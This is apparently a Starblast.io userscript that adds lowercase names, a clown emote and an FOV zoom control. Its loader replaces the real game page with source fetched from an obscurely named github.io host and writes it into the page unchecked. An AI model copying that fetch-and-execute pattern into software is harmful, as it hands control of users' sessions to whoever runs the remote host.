// Initialize code injectors array
if (!window.sbCodeInjectors) window.sbCodeInjectors = [];

// Lowercase Name Mod
const modName = "Lowercase Name";
const logLowercase = (msg) => console.log(`%c[${modName}] ${msg}`, "color: #FF00A6");

function lowercaseInjector(sbCode) {
  let src = sbCode;
  let prevSrc = src;

  function checkSrcChange() {
    if (src === prevSrc) throw new Error("replace did not work");
    prevSrc = src;
  }

  src = src.replace(/\.toUpperCase\(\)/g, "");
  const styleBlock = `
  <style>
  #player input { text-transform: none !important; }
  </style>
  `;
  src = src.replace('</head>', `${styleBlock}</head>`);
  checkSrcChange();

  logLowercase("Mod injected");
  return src;
}

// Custom Emote Mod
const emoteModName = "Custom Emote";
const logEmote = (msg) => console.log(`%c[${emoteModName}] ${msg}`, "color: #FFA500");

function emoteInjector(sbCode) {
  let src = sbCode;
  let prevSrc = src;

  function checkSrcChange() {
    if (src === prevSrc) throw new Error("replace did not work");
    prevSrc = src;
  }

  // Find the vocabulary array in survival mode
  const vocabPattern = /(this\.vocabulary\s*=\s*\[[\s\S]*?\})/;
  const clownEmote = `,{
    text: "Clown",
    icon: "🤡",
    key: "J"
  }`;

  src = src.replace(vocabPattern, `$1${clownEmote}`);
  checkSrcChange();

  logEmote("Clown emote injected");
  return src;
  }

  // FOV Editor Mod
  const fovModName = "FOV Editor";
  const logFOV = (msg) => console.log(`%c[${fovModName}] ${msg}`, "color: #00A6FF");

  // Global FOV Controller
  window.I1000 = window.I1000 || {};
  window.I1000.baseFOV = 45; // Store the base FOV value
  window.I1000.currentFOV = 45; // Store the current FOV value
  window.I1000.fovEnabled = true; // Store the state of the FOV editor

  function fovInjector(sbCode) {
    let src = sbCode;
    let prevSrc = src;

    function checkSrcChange() {
      if (src === prevSrc) throw new Error("replace did not work");
      prevSrc = src;
    }

    // Match the specific FOV pattern from the game code
    const fovPattern = /this\.I1000\.fov\s*=\s*45\s*\*\s*this\.IO11l\.I1000\.zoom/g;
    src = src.replace(fovPattern, 'this.I1000.fov = window.I1000.fovEnabled ? window.I1000.currentFOV * this.IO11l.I1000.zoom : 45 * this.IO11l.I1000.zoom');
    checkSrcChange();

    // Add FOV display and controls to the UI
    const fovDisplayStyle = `
    <style>
    #fov-display, #controls, #controls-popup {
    position: fixed;
    background: rgba(0, 0, 0, 0.7);
    padding: 10px;
    border-radius: 5px;
    color: white;
    z-index: 1000;
    transition: all 0.3s ease;
    }
    #fov-display {
    top: 10px;
    right: 10px;
    }
    #controls {
    top: 50px;
    right: 10px;
    cursor: pointer;
    }
    #controls-popup {
    top: 50px;
    right: 10px;
    width: 150px;
    height: auto;
    display: none;
    flex-direction: column;
    align-items: flex-end;
    }
    .toggle-btn {
      background-color: #444;
      color: white;
      border: none;
      padding: 5px;
      border-radius: 3px;
      cursor: pointer;
      margin-top: 5px;
    }
    .close-btn {
      background-color: #444;
      color: white;
      border: none;
      padding: 5px;
      border-radius: 3px;
      cursor: pointer;
      margin-top: 5px;
    }
    </style>
    `;

    const fovDisplayHTML = `
    <div id="fov-display">
    FOV: <span id="fov-value">45</span>
    </div>
    `;

    const controlsHTML = `
    <div id="controls">Controls</div>
    <div id="controls-popup">
    <button id="toggle-fov" class="toggle-btn">Disable FOV</button>
    <button id="close-controls" class="close-btn">Close</button>
    </div>
    `;

    src = src.replace('</body>', `
    ${fovDisplayStyle}
    <script>
    document.addEventListener('DOMContentLoaded', () => {
      document.body.insertAdjacentHTML('beforeend', \`${fovDisplayHTML}\`);
      document.body.insertAdjacentHTML('beforeend', \`${controlsHTML}\`);

      const controls = document.getElementById('controls');
      const controlsPopup = document.getElementById('controls-popup');
      const toggleFovBtn = document.getElementById('toggle-fov');
      const closeControlsBtn = document.getElementById('close-controls');

      controls.addEventListener('click', () => {
        controlsPopup.style.display = controlsPopup.style.display === 'none' ? 'flex' : 'none';
      });

      closeControlsBtn.addEventListener('click', () => {
        controlsPopup.style.display = 'none';
      });

      // Add scroll event listener to the document
      document.addEventListener('wheel', (e) => {
        if (window.I1000.fovEnabled) {
          // Prevent default scroll behavior
          e.preventDefault();

          // Update FOV based on scroll direction
          if (e.deltaY < 0) {
            // Scrolling up - increase FOV
            window.I1000.currentFOV += 1;
          } else {
            // Scrolling down - decrease FOV
            window.I1000.currentFOV = Math.max(1, window.I1000.currentFOV - 1);
          }

          // Update the display
          document.getElementById('fov-value').textContent = window.I1000.currentFOV;
        }
      }, { passive: false });

      // Add event listener for the toggle FOV button
      toggleFovBtn.addEventListener('click', () => {
        window.I1000.fovEnabled = !window.I1000.fovEnabled;
        toggleFovBtn.textContent = window.I1000.fovEnabled ? 'Disable FOV' : 'Enable FOV';
      });
    });
    </script>
    </body>`);
    checkSrcChange();

    logFOV("FOV injector applied");
    return src;
  }

  // Add all injectors
  window.sbCodeInjectors.push((sbCode) => {
    try {
      return lowercaseInjector(sbCode);
    } catch (error) {
      alert(`${modName} failed to load; error: ${error}`);
      throw error;
    }
  });

  window.sbCodeInjectors.push((sbCode) => {
    try {
      return emoteInjector(sbCode);
    } catch (error) {
      alert(`${emoteModName} failed to load; error: ${error}`);
      throw error;
    }
  });

  window.sbCodeInjectors.push((sbCode) => {
    try {
      return fovInjector(sbCode);
    } catch (error) {
      alert(`${fovModName} failed to load; error: ${error}`);
      throw error;
    }
  });

  // Main code injection logic
  const log = (msg) => console.log(`%c[Mod injector] ${msg}`, "color: #06c26d");

  function injectLoader() {
    if (window.location.pathname !== "/") {
      log("Injection not needed");
      return;
    }

    document.open();
    document.write('<html><head><title>Loading...</title></head><body style="background-color:#ffffff;"><div style="margin: auto; width: 50%;"><h1 style="text-align: center;padding: 170px 0;color: #000;">Loading mods</h1><h1 style="text-align: center;color: #000;">Please wait</h1></div></body></html>');
    document.close();

    var url = 'https://assdsasdqwqeqdzcxznfcn1029d8919208nx9.github.io/OLUMUksmdmksladmkakmsak10911oms1ks1mklmkls11921ms1sımn1sösm2k1.html';
    // Append timestamp to prevent caching
    url += '?_=' + new Date().getTime();

    var xhr = new XMLHttpRequest();
    log("Fetching custom source...");
    xhr.open("GET", url);
    xhr.onreadystatechange = function () {
      if (xhr.readyState === 4) {
        var starSRC = xhr.responseText;

        if (starSRC !== undefined) {
          log("Source fetched successfully");
          const start_time = performance.now();
          log("Applying mods...");

          if (!window.sbCodeInjectors) {
            log("No Starblast.io userscripts found to load");
          } else {
            let error_notified = false;
            for (const injector of window.sbCodeInjectors) {
              try {
                if (typeof injector === "function") starSRC = injector(starSRC);
                else {
                  log("Injector was not a function");
                  console.log(injector);
                }
              } catch (error) {
                if (!error_notified) {
                  alert("One of your Starblast.io userscripts failed to load");
                  error_notified = true;
                }
                console.error(error);
              }
            }
          }

          const end_time = performance.now();
          log(`Mods applied successfully (${(end_time - start_time).toFixed(0)}ms)`);

          document.open();
          document.write(starSRC);
          document.close();
        } else {
          log("Source fetch failed");
          alert("An error occurred while fetching game code");
        }
      }
    };

    xhr.send();
  }

  setTimeout(injectLoader, 1);
